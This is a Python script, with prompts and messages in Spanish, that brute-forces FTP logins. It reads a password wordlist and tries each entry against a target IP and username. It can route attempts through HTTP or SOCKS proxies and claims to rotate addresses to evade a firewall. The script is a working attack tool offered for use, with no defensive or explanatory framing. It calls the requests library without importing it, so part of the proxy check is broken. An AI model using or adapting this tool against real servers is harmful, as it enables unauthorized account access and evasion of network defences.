import time
import os
import random
import signal
from colorama import Fore, Style, init
from ftplib import FTP
import socks
import socket

init()

def load_proxies(file_path):
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
        proxies = file.read().splitlines()
    return proxies

def get_random_proxy(proxies):
    return random.choice(proxies)

def is_proxy_working(proxy):
    proxy_type = "http" if proxy.startswith("http") else "socks4" if proxy.startswith("socks4") else "socks5"
    proxies = {proxy_type: proxy}
    try:
        response = requests.get("http://www.google.com", proxies=proxies, timeout=5)
        return response.status_code == 200
    except:
        return False

def set_proxy(proxy):
    if proxy.startswith("http"):
        os.environ["http_proxy"] = proxy
        os.environ["https_proxy"] = proxy
    elif proxy.startswith("socks4"):
        socks.set_default_proxy(socks.SOCKS4, proxy.split("//")[1].split(":")[0], int(proxy.split(":")[-1]))
        socket.socket = socks.socksocket
    elif proxy.startswith("socks5"):
        socks.set_default_proxy(socks.SOCKS5, proxy.split("//")[1].split(":")[0], int(proxy.split(":")[-1]))
        socket.socket = socks.socksocket
    pass

def ftp_brute_force(host, port, username, password_file, use_proxies, proxies, wait_time):
    with open(password_file, 'r', encoding='utf-8', errors='ignore') as file:
        passwords = file.readlines()
    
    for index, password in enumerate(passwords):
        password = password.strip()
        if use_proxies:
            proxy = get_random_proxy(proxies)
            if is_proxy_working(proxy):
                set_proxy(proxy)
            else:
                print(f"{Fore.YELLOW}[*] Proxy no funciona: {proxy}{Style.RESET_ALL}")
                continue
        
        start_time = time.time()
        
        try:
            ftp = FTP()
            ftp.connect(host, port, timeout=3)
            ftp.login(user=username, passwd=password)
            print(f"{Fore.GREEN}[+] Contraseña encontrada: {password}{Style.RESET_ALL}")
            ftp.quit()
            return True
        except Exception as e:
            print(f"{Fore.RED}[-] Contraseña incorrecta o error: {password} - {e}{Style.RESET_ALL}")
        
        elapsed_time = time.time() - start_time
        sleep_time = max(0, wait_time - elapsed_time)
        print(f"Esperando {sleep_time} segundos antes del siguiente intento...")
        time.sleep(sleep_time)
        
        if index % 5 == 0 and use_proxies:
            print("[*] Cambiando dirección IP para evadir el firewall...")
            time.sleep(5)
    
    print("[-] No se encontró ninguna contraseña válida.")
    return False

def signal_handler(sig, frame):
    print("\nPrograma terminado por el usuario.")
    exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGTSTP, signal_handler)  # Capturar Ctrl + Z

    host = input("Introduce la IP del objetivo: ")
    port = 21  # Puerto FTP
    username = input("Introduce el nombre de usuario: ")
    password_file = input("Introduce la ruta del archivo de contraseñas: ")
    
    use_proxies = input("¿Deseas usar proxies? (Y/N): ").strip().upper() == 'Y'
    if use_proxies:
        proxy_type = input("Introduce el tipo de proxy (http/socks4/socks5): ").strip().lower()
        proxy_ip = input("Introduce la IP del proxy: ").strip()
        proxy_port = int(input("Introduce el puerto del proxy: ").strip())
        proxy = f"{proxy_type}://{proxy_ip}:{proxy_port}"
        proxies = [proxy]
    else:
        proxies = []
    
    wait_time = float(input("Introduce el tiempo de espera entre intentos (en segundos): ").strip())
    print(f"Tiempo de espera configurado: {wait_time} segundos")
    
    ftp_brute_force(host, port, username, password_file, use_proxies, proxies, wait_time)
